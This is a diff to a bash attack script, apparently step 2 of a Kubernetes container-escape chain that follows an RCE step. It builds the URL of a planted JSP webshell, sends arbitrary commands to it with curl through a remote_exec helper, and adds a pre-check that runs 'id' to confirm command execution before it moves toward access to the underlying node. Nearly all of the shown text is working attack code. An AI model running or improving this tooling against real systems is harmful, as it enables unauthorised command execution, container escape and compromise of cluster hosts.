@@ -6,8 +6,6 @@
 # and access the underlying node.
 ###############################################
 
-set -e
-
 [ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1
 
 # Read webshell info from step 1
@@ -15,15 +13,28 @@ SHELL_FILE="/tmp/.k8s-escape-shell"
 if [ -f "$SHELL_FILE" ]; then
     SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
     SHELL_HOST=$(sed -n '2p' "$SHELL_FILE")
-    # Use saved HOST if current HOST matches, otherwise use current HOST
-    SHELL_URL="http://${HOST}/${SHELL_NAME}.jsp"
+    SHELL_CTX=$(sed -n '3p' "$SHELL_FILE")
+    # Determine URL based on deployment context
+    if [ "$SHELL_CTX" = "ROOT" ]; then
+        SHELL_URL="http://${HOST}/${SHELL_NAME}.jsp"
+    else
+        SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
+    fi
 else
     echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
     exit 1
 fi
 
 remote_exec() {
-    curl -s --data-urlencode "cmd=$1" "$SHELL_URL" \
+    local RAW
+    RAW=$(curl -s -o /dev/stdout -w "\n__HTTP_%{http_code}__" --data-urlencode "cmd=$1" "$SHELL_URL")
+    local HTTP_CODE
+    HTTP_CODE=$(echo "$RAW" | grep -o '__HTTP_[0-9]*__' | grep -o '[0-9]*')
+    # Filter out HTTP errors (404, 500, etc.)
+    if [ "$HTTP_CODE" != "200" ] 2>/dev/null; then
+        return 1
+    fi
+    echo "$RAW" | sed 's/__HTTP_[0-9]*__$//' \
         | tr -d '\0' \
         | sed '/^\s*$/d' \
         | grep -v 'java\.io\.InputStream' \
@@ -36,6 +47,18 @@ echo "================================================"
 echo "  STEP 2: Container Escape"
 echo "================================================"
 echo "  Webshell: ${SHELL_NAME}.jsp"
+echo "  URL: ${SHELL_URL}"
+echo ""
+
+# ── Pre-check: verify webshell is accessible ──
+echo "> Verifying webshell is accessible..."
+PRECHECK=$(remote_exec "id")
+if [ -z "$PRECHECK" ] || ! echo "$PRECHECK" | grep -q "uid="; then
+    echo "  [FAIL] Webshell is not responding (HTTP error or missing JSP)"
+    echo "  Re-run step 1 first: ./01-exploit-rce.sh"
+    exit 1
+fi
+echo "  [OK] Webshell responding: $(echo "$PRECHECK" | head -1)"
 echo ""
 
 # ── 2.1 Verify container ────────────────────
